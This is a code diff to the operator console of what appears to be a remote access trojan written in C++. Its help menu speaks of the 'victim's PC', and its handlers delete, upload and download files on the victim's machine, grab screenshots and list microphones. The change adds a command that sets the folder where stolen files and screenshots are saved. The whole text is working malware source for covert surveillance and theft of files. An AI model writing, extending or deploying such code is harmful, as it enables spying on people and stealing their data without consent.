@@ -39,6 +39,8 @@ void help_menu()
 {
     ColoredText(F_LIGHTCYAN);
     printf("==============HELP-MENU==============\n");
+    printf("--------SERVER SETTINGS--------\n\n");
+    printf("folder <path> - set folder to download files\n\n");
     printf("--------FILE TRANSFERING--------\n\n");
     printf("delete <file> - remove file from victim`s PC\n\n");
     printf("upload <file> - send file to victim's PC\n\n");
@@ -210,11 +212,19 @@ int main(int argc, char* argv[])
             else if (command.substr(0, 8) == "download") {
                 if (command.length() > 8) {
                     SendAndReceive(client, command);
-                    std::string filePath = command.substr(9);
-                    std::filesystem::path path(filePath);
-                    std::string filename = path.filename().string();
+                    std::string filePath = command.substr(9); // path to file on victim's pc
+                    std::filesystem::path path(filePath); // convert string to path
+                    std::string filename = path.filename().string(); // get filename from path (C:/Users/Victim/file.txt -> file.txt)
 
-                    ReceiveFile(client, filename);
+                    // std::filesystem::path downloadFolderPath(DOWNLOAD_FOLDER);
+                    // std::filesystem::path fullFilePath = downloadFolderPath / filename;
+                    // std::string fullFilePathStr = fullFilePath.string();
+
+                    // ReceiveFile(client, fullFilePathStr);
+
+                    std::string fullFilePath = DOWNLOAD_FOLDER + filename;
+                    
+                    ReceiveFile(client, fullFilePath);
                 } else {
                     ColoredText(F_LIGHTRED);
                     printf("[!] Usage: download <filename>\n");
@@ -297,16 +307,19 @@ int main(int argc, char* argv[])
                 send(client, command.c_str(), command.size(), 0);
 
                 std::string filename = GenerateRandomFilename() + ".bmp";
-                ReceiveFile(client, filename);
+                std::string fullPath = DOWNLOAD_FOLDER + filename;
+
+                ReceiveFile(client, fullPath);
+                
                 ColoredText(F_CYAN);
                 printf("[*] Screenshot received: %s\n", filename.c_str());
 
                 // open screenshot
-                HINSTANCE hInstance = ShellExecute(NULL, "open", filename.c_str(), NULL, NULL, SW_SHOWMAXIMIZED);
+                HINSTANCE hInstance = ShellExecute(NULL, "open", fullPath.c_str(), NULL, NULL, SW_SHOWMAXIMIZED);
                 if ((int)hInstance <= 32)
                 {
                     ColoredText(F_LIGHTRED);
-                    printf("[*] Failed to open %s\n", filename);
+                    printf("[*] Failed to open %s\n", fullPath);
                 }
             }
             else if (command.substr(0, 4) == "play") {
@@ -354,6 +367,26 @@ int main(int argc, char* argv[])
             }
             else if (command == "microphones" || command == "mics") {
                 SendAndReceive(client, command);
+            }
+            else if (command.substr(0, 6) == "folder") {
+                if (command.length() > 6) {
+                    std::string prev_folder = DOWNLOAD_FOLDER;
+
+                    std::string folderPath = command.substr(7);
+                    
+                    if (folderPath.back() != '/') { // check if path ends with "/"
+                        folderPath += '/';
+                    }
+                    
+                    DOWNLOAD_FOLDER = folderPath; // includes.h
+                    
+                    ColoredText(F_CYAN);
+                    printf("[*] Download folder changed from %s to %s\n", prev_folder.c_str(), DOWNLOAD_FOLDER.c_str());
+                } else {
+                    ColoredText(F_LIGHTRED);
+                    printf("[!] Usage: folder <path/to/folder/>\n");
+                    printf("[!] Current download folder: %s\n", DOWNLOAD_FOLDER.c_str());
+                }
             }
 
             else if (command == "help") {
